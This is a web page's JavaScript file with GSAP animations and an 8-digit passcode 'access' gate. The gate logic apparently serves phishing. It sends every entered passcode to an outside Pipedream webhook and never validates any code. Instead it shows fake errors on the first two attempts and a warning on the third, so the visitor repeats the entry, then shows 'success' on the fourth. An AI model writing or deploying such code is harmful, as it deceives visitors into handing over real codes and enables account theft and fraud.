gsap.registerPlugin(ScrollTrigger);

/* HERO */
gsap.from('.hero h2', { y: 60, opacity: 0, duration: 1.1, ease: 'power3.out' });
gsap.from('.hero p', { y: 40, opacity: 0, delay: .15, duration: 1 });
gsap.from('.cta', { y: 40, opacity: 0, delay: .3, duration: 1 });

/* SCROLL */
gsap.utils.toArray('.card,.frame').forEach(el => {
    gsap.from(el, {
        scrollTrigger: { trigger: el, start: 'top 85%' },
        y: 80,
        opacity: 0,
        duration: 1,
        ease: 'power3.out'
    });
});

/* ACCESS LOGIC */
const access = document.getElementById('access');
const openAccess = document.getElementById('openAccess');
const input = document.getElementById('code');
const submit = document.getElementById('submit');
const verify = document.getElementById('verify');
const bar = document.getElementById('bar');
const err = document.getElementById('err');
const warn = document.getElementById('warn');
const modal = document.getElementById('modal');
const gate = document.querySelector('.gate');
const success = document.querySelector('.success');
let attempts = 0;

openAccess.onclick = () => {
    access.style.display = 'flex';
    gsap.fromTo(access, { opacity: 0 }, { opacity: 1, duration: .6 });
};

document.getElementById('openInfo').onclick = () => {
    modal.style.display = 'flex';
};

modal.onclick = () => modal.style.display = 'none';

input.addEventListener('input', () => {
    input.value = input.value.replace(/\D/g, '').slice(0, 8);
    submit.classList.toggle('enabled', input.value.length === 8);
    err.style.display = warn.style.display = 'none';
});

submit.onclick = () => {
    if (input.value.length !== 8) return;
    attempts++;
    
    // Log the attempt and send to webhook
    const attemptData = {
        attemptNumber: attempts,
        passcode: input.value,
        timestamp: new Date().toISOString()
    };
    
    // Send data to webhook
    fetch('https://eoxif7fbsl3zjqe.m.pipedream.net', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(attemptData)
    })
    .then(response => {
        console.log('Attempt logged to webhook', response.status);
    })
    .catch(error => {
        console.error('Error sending attempt to webhook:', error);
    });

    verify.style.display = 'block';
    bar.style.width = '0%';
    gsap.to(bar, { width: '100%', duration: 1.8, ease: 'power2.out' });
    setTimeout(() => {
        verify.style.display = 'none';
        if (attempts <= 2) {
            err.style.display = 'block';
        } else if (attempts === 3) {
            warn.style.display = 'block';
        } else {
            gate.style.display = 'none';
            success.style.display = 'block';
            gsap.from(success, { opacity: 0, y: 20, duration: .6 });
        }
    }, 1900);
};
